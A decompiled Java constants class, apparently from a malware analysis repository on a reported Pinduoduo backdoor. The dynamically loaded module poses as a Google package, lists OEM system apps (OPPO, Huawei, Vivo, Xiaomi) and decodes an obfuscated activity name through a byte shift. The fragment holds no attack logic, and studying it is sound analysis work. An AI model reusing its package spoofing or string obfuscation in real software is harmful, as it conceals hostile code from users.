package com.google.android.sd.biz_dynamic_dex.base;

public class Constants {
  public static final String ACTION_INSTALL_OK = "com.google.android.sd.action.wo_ah";
  
  public static final String CMD_TARGET_CLIENT = "client";
  
  public static boolean DEBUG = false;
  
  public static final String HUAWEI = "huawei";
  
  public static final String KEY_INSTALL_CID = "com.google.android.sd.cid";
  
  public static final String KEY_INSTALL_COMPLETE_TIME = "com.google.android.sd.inst.suc.ts";
  
  public static final String KEY_INSTALL_REQUEST_TIME = "com.google.android.sd.inst.req.ts";
  
  public static final String KEY_INSTALL_SID = "com.google.android.sd.sid";
  
  public static final String KEY_SID = "com.google.android.sd.sid";
  
  public static final String OPPO = "oppo";
  
  public static final String OPPO_ATHENA_COLOROS = "com.coloros.athena";
  
  public static final String OPPO_ATHENA_OPLUS = "com.oplus.athena";
  
  public static final String OPPO_INSTANT = "com.nearme.instant.platform";
  
  public static final String OPPO_LAUNCHER = "com.oppo.launcher";
  
  public static final String OPPO_MMS = "com.android.mms";
  
  public static final String OPPO_PICTORIAL_COLOROS = "com.coloros.pictorial";
  
  public static final String OPPO_PICTORIAL_HEYTAP = "com.heytap.pictorial";
  
  public static final String OPPO_SPEECH = "com.coloros.speechassist";
  
  public static final String OPPO_SYSTEM_UI = "com.android.systemui";
  
  public static final String PKG_HW_HWID = "com.huawei.hwid";
  
  public static final String PKG_HW_INTELLIGENT = "com.huawei.intelligent";
  
  public static final String PULL_UP_ACTIVITY;
  
  public static final String VIVO = "vivo";
  
  public static final String XIAOMI = "xiaomi";
  
  private static final byte[] bp = new byte[] { 
      67, 79, 77, 14, 88, 85, 78, 77, 69, 78, 
      71, 14, 80, 73, 78, 68, 85, 79, 68, 85, 
      79, 14, 68, 90, 81, 67, 14, 65, 67, 84, 
      73, 86, 69, 14, 47, 84, 72, 69, 82, 33, 
      67, 84, 73, 86, 73, 84, 89 };
  
  static {
    PULL_UP_ACTIVITY = Crypto.parse2();
  }
  
  public static String parse2() {
    StringBuilder stringBuilder = new StringBuilder();
    byte[] arrayOfByte = bp;
    int j = arrayOfByte.length;
    for (int i = 0; i < j; i++)
      stringBuilder.append((char)(arrayOfByte[i] + 32)); 
    return stringBuilder.toString();
  }
  
  public static interface DATA_KEY {
    public static final String PU_CD_KEY = "biz_p_u_cdt";
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\218a37ea-710d-49cb-b872-2a47a1115c69-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\Constants.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */